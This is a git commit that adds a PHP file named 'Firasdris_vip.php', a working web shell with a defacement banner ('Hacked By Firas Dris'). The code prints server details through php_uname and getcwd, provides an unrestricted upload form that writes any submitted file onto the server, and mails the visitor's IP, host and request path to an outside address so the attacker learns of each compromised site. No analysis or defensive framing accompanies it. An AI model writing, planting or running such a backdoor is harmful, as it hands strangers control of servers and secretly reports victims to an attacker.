a647d60dc99e562c77d07a03ac9d541cf011eb2e
firasdris54487 <61518027+firasdris54487@users.noreply.github.com>
2020-02-26 20:23:25 +0100

    Create Firasdris_vip.php

---
+++ Firasdris_vip.php
@@ -0,0 +1,19 @@
+<?php
+$str = 'SGFja2VkIEJ5IEZpcmFzZHJpcw==';echo base64_decode($str);
+
+?>
+<title>Vuln!! patch it Now! Hacked By Firas Dris</title>
+<?php echo 'MisterSpyv7up uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
+?>
+<?php
+$ip = getenv("REMOTE_ADDR");
+$ra44 = rand(1, 99999);
+$subj98 = " Bot v6 Rzlt |$ip";
+$email = "firasdris54487@aol.fr";
+$from = "From: Result<botv3@mrspybotv3.com";
+$a45 = $_SERVER['REQUEST_URI'];
+$b75 = $_SERVER['HTTP_HOST'];
+$m22 = $ip . "";
+$msg8873 = "$a45 $b75 $m22";
+mail($email, $subj98, $msg8873, $from);
+?>
